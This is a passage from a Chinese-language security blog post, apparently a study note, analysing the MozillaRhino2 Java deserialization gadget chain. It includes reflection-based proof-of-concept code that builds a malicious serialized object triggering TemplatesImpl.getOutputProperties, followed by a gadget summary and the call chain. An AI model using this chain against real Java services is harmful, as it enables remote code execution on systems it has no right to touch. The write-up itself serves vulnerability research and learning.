associatedValues);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt;       memberBoxClass = Class.forName(<span class="string">&quot;org.mozilla.javascript.MemberBox&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; constructor    = memberBoxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">		constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="type">Object</span> <span class="variable">initContextMemberBox</span> <span class="operator">=</span> constructor.newInstance(Context.class.getMethod(<span class="string">&quot;enter&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="type">ScriptableObject</span> <span class="variable">initContextScriptableObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">		<span class="type">Method</span>           <span class="variable">makeSlot</span>                    <span class="operator">=</span> ScriptableObject.class.getDeclaredMethod(<span class="string">&quot;accessSlot&quot;</span>, String.class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">		makeSlot.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="type">Object</span> <span class="variable">slot</span> <span class="operator">=</span> makeSlot.invoke(initContextScriptableObject, <span class="string">&quot;su18&quot;</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt; slotClass   = Class.forName(<span class="string">&quot;org.mozilla.javascript.ScriptableObject$GetterSlot&quot;</span>);</span><br><span class="line">		<span class="type">Field</span>    <span class="variable">getterField</span> <span class="operator">=</span> slotClass.getDeclaredField(<span class="string">&quot;getter&quot;</span>);</span><br><span class="line">		getterField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		getterField.set(slot, initContextMemberBox);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化 NativeJavaObject 类</span></span><br><span class="line">		<span class="type">NativeJavaObject</span> <span class="variable">initContextNativeJavaObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObject</span>();</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">parentField</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line">		parentField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		parentField.set(initContextNativeJavaObject, scope);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">isAdapterField</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;isAdapter&quot;</span>);</span><br><span class="line">		isAdapterField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		isAdapterField.set(initContextNativeJavaObject, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">adapterObject</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;adapter_writeAdapterObject&quot;</span>);</span><br><span class="line">		adapterObject.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		adapterObject.set(initContextNativeJavaObject, MozillaRhino2.class.getDeclaredMethod(<span class="string">&quot;customWriteAdapterObject&quot;</span>,</span><br><span class="line">				Object.class, ObjectOutputStream.class));</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">javaObject</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;javaObject&quot;</span>);</span><br><span class="line">		javaObject.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		javaObject.set(initContextNativeJavaObject, initContextScriptableObject);</span><br><span class="line"></span><br><span class="line">		<span class="type">ScriptableObject</span> <span class="variable">scriptableObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Environment</span>();</span><br><span class="line">		scriptableObject.setParentScope(initContextNativeJavaObject);</span><br><span class="line">		makeSlot.invoke(scriptableObject, <span class="string">&quot;outputProperties&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化 NativeJavaArray类</span></span><br><span class="line">		<span class="type">NativeJavaArray</span> <span class="variable">nativeJavaArray</span> <span class="operator">=</span> (NativeJavaArray) SerializeUtil.createInstanceUnsafely(NativeJavaArray.class);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">parentField2</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line">		parentField2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		parentField2.set(nativeJavaArray, scope);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">javaObject2</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;javaObject&quot;</span>);</span><br><span class="line">		javaObject2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		javaObject2.set(nativeJavaArray, tmpl);</span><br><span class="line"></span><br><span class="line">		nativeJavaArray.setPrototype(scriptableObject);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">prototypeField</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;prototype&quot;</span>);</span><br><span class="line">		prototypeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		prototypeField.set(nativeJavaArray, scriptableObject);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化最外层的 NativeJavaObject</span></span><br><span class="line"></span><br><span class="line">		<span class="type">NativeJavaObject</span> <span class="variable">nativeJavaObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObject</span>();</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">parentField3</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line">		parentField3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		parentField3.set(nativeJavaObject, scope);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">isAdapterField3</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;isAdapter&quot;</span>);</span><br><span class="line">		isAdapterField3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		isAdapterField3.set(nativeJavaObject, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">adapterObject3</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;adapter_writeAdapterObject&quot;</span>);</span><br><span class="line">		adapterObject3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		adapterObject3.set(nativeJavaObject, MozillaRhino2.class.getDeclaredMethod(<span class="string">&quot;customWriteAdapterObject&quot;</span>,</span><br><span class="line">				Object.class, ObjectOutputStream.class));</span><br><span class="line"></span><br><span class="line">		<span class="type">Field</span> <span class="variable">javaObject3</span> <span class="operator">=</span> NativeJavaObject.class.getDeclaredField(<span class="string">&quot;javaObject&quot;</span>);</span><br><span class="line">		javaObject3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		javaObject3.set(nativeJavaObject, nativeJavaArray);</span><br><span class="line"></span><br><span class="line">		SerializeUtil.writeObjectToFile(nativeJavaObject, fileName);</span><br><span class="line">		SerializeUtil.readFileObject(fileName);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 MozillaRhino2 链分析的全部内容了，可以看到，这两条链的作者对 Rhino 的功能和实现特别了解，调用链十分长且难懂，最后总结一下。</p>
<ol>
<li><p>利用说明：</p>
<ul>
<li>NativeJavaObject 在反序列化时调用 JavaAdapter 的 readAdapterObject 来处理指定的 NativeJavaArray 类，会调用其中 prototype 中的 Environment 类中 slots 的 getter 方法，由 JavaMembers 的 get 方法触发。</li>
</ul>
</li>
<li><p>Gadget 总结：</p>
<ul>
<li>kick-off gadget：org.mozilla.javascript.NativeJavaObject#readObject()</li>
<li>sink gadget：org.mozilla.javascript.JavaMembers#get()</li>
<li>chain gadget：org.mozilla.javascript.JavaAdapter#getAdapterClass()</li>
</ul>
</li>
<li><p>调用链展示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NativeJavaObject.readObject()</span><br><span class="line">    JavaAdapter.readAdapterObject()</span><br><span class="line">        JavaAdapter.getAdapterClass()</span><br><span class="line">            JavaAdapter.getObjectFunctionNames()</span><br><span class="line">                ScriptableObject.getPropertyIds()</span><br><span class="line">                    NativeJavaArray.getIds()</span><br><span class="line">                        Environment.getIds()</span><br><span class="line">                            ScriptableObject.getIds()</span><br><span class="line">                                ScriptableObject.getProperty()</span><br><span class="line">                                    NativeJavaArray.get()</span><br><span class="line">                                        JavaMembers.get()</span><br><span class="line">                                            TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure>
</li>
<li><p>依赖版本</p>
</li>
</ol>
<p>rhino-js &gt; 1.6R6</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Java/" class="tag">#Java</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">D3CTF x AntCTF 2023 Web 赛后复现</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Weblogic全漏洞学习</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>